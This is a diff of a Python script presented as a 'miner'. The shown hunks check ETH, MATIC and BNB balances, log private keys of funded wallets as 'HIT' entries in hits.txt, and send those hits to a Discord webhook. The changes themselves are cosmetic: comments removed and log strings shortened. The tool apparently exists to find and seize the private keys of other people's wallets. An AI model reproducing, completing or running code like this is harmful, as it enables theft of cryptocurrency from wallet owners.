@@ -21,29 +21,29 @@ def Spinner():
         time.sleep(0.2)
 
 try:
-    import psutil # Needs to be installed (pip install psutil)
+    import psutil 
 except ImportError:
     input("Module 'psutil' not found/installed, to install run: 'pip install psutil' \n Press enter to exit the program")
     exit()
 
 try:
-    import requests # (pip install requests) 
+    import requests 
 except ImportError:
     input("Module 'requests' not found/installed, to install run: 'pip install requests' \n Press enter to exit the program")
     exit()
 
 try:
-    from web3 import Web3 # (pip install web3)
+    from web3 import Web3 
 except ImportError:
     input("Module 'web3' not found/installed, to install run: 'pip install web3' \n Press enter to exit the program")
     exit()
 try:
-    from datetime import datetime # (pip install datetime)
+    from datetime import datetime
 except ImportError:
     input("Module 'datetime' not found/installed, to install run: 'pip install datetime' \n Press enter to exit the program")
     exit()
 try:
-    from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
+    from discord_webhook import DiscordWebhook, DiscordEmbed
 except ImportError:
     input("Module 'discord_webhook' not found/installed, to install run: 'pip install discord_webhook' \n Press enter to exit the program")
     exit()
@@ -198,11 +198,11 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                         print('\033[32mRecording hit in "hits.txt"...\033[0m')
                         hitstxt = open("hits.txt", "a")
                         if bal > 2000000000000000:
-                            hitstxt.write("> N E W   H I T! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
+                            hitstxt.write("> HIT ! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                         if balp > 0:
-                            hitstxt.write("> N E W   H I T! pKey: %s - MATIC: %s\n"%(key, str(bal*0.95/1000000000000000000)))
+                            hitstxt.write("> HIT ! pKey: %s - MATIC: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                         if balb > 0:
-                            hitstxt.write("> N E W   H I T! pKey: %s - BNB: %s\n"%(key, str(bal*0.95/1000000000000000000)))
+                            hitstxt.write("> HIT! pKey: %s - BNB: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                         hitstxt.close()
                         if (webhookurl != "null"):
                             webhook = DiscordWebhook(url=webhookurl, description="@everyone", rate_limit_retry=True)
@@ -340,9 +340,6 @@ if __name__=="__main__":
                     if cudabool.lower() == "yes" or cudabool.lower() == "y":
                         printf("\033[31mGPU Acceleration not available.\n\033[0m", 0.002)
                         cudabool = False
-                        #cudabool = True
-                        #printf("\033[32mNVIDIA CUDA ACCELERATION: ", 0.002)
-                        #printf("O N\n\033[0m", 0.6)
                     else: cudabool = False
                 else: print(str(cudabool))
                 printf("Do you want to enable Discord Webhook logging (yes/no): ",0.002)
@@ -357,7 +354,7 @@ if __name__=="__main__":
                         webhookurl = "null"
                 else: 
                     print(str(webhookurl))
-                    if not "webhooks" in str(webhookurl) or not "https://" in str(webhookurl): webhookurl= "null" ##<<<=== MF here is faulty
+                    if not "webhooks" in str(webhookurl) or not "https://" in str(webhookurl): webhookurl= "null" 
                 printf("Do you want to enable bad hit logging (yes/no): ", 0.002)
                 if config_yaml == False: 
                     badhitboolean = input()
@@ -400,7 +397,7 @@ if __name__=="__main__":
                             print("\033[31mERROR | Process Suppressed | RAM is Saturated\033[0m")
                         if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                         updP.join()
-                        #print("Connection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord") 
+
                     else:
                         w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                         print("\033[33mConnection to Main RPC failed! Trying to connect to Backup RPC... \033[0m")
@@ -481,11 +478,3 @@ if __name__=="__main__":
             else:
                 print("That's not a valid ETHEREUM address!")
                 input("\nMiner stopped. Please restart.")
-    #except Exception as e:
-    #    if "DATA" in str(e):
-    #        print("[ EXCEPTION HELPER ] - Make sure the DATA file is in the same directory as the .exe and relaunch the miner")
-    #        input("")
-    #    else:
-    #        print("[ EXCEPTION HELPER ] - An error occurred during code excecution. Printing error...\n")
-    #        print(e)
-    #        input("") 
